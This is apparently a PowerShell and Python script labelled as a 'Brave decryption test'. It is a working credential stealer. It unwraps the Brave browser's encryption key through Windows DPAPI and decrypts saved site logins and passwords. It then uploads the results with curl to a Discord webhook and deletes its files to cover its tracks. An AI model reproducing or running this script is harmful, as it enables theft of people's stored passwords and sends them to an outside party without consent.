cd $env:TEMP\py

@'
import os,json,base64,sqlite3,shutil,win32crypt
from Crypto.Cipher import AES

print("=== BRAVE DECRYPTION TEST ===")

brave_path = os.path.expandvars(r"%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data")
local_state_path = os.path.join(brave_path, "Local State")
login_data_path = os.path.join(brave_path, "Default", "Login Data")

# Extraire la clé
print("Extracting key...")
with open(local_state_path, 'r', encoding='utf-8') as f:
    local_state = json.load(f)
encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
print(f"Key OK: {len(key)} bytes")

# Copier DB
temp_db = "brave_test.db"
if os.path.exists(temp_db):
    os.remove(temp_db)
shutil.copy2(login_data_path, temp_db)
print("DB copied")

# Déchiffrer
conn = sqlite3.connect(temp_db)
cur = conn.cursor()
cur.execute("SELECT origin_url, username_value, password_value FROM logins WHERE username_value != '' LIMIT 5")

for url, user, enc_pwd in cur.fetchall():
    try:
        nonce = enc_pwd[3:15]
        ciphertext = enc_pwd[15:-16]
        tag = enc_pwd[-16:]
        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
        pwd = cipher.decrypt_and_verify(ciphertext, tag).decode('utf-8')
        print(f"\n{url}\nUser: {user}\nPass: {pwd}")
    except Exception as e:
        print(f"\nFAILED {url}: {e}")

conn.close()
os.remove(temp_db)
'@ | Out-File "test2.py" -Encoding UTF8

$result = .\python.exe test2.py 2>&1 | Out-String
$result | Out-File "result2.txt"
curl.exe -F "file=@result2.txt" "https://discord.com/api/webhooks/1467597897435582594/wbqYsXdKoKB124ig5QJCGBBb88kmkTUpEKGEq0A6oZ-81uZ0ecgtHM-D8Zq44U7uh_8W"
Remove-Item test2.py,result2.txt -Force -EA 0
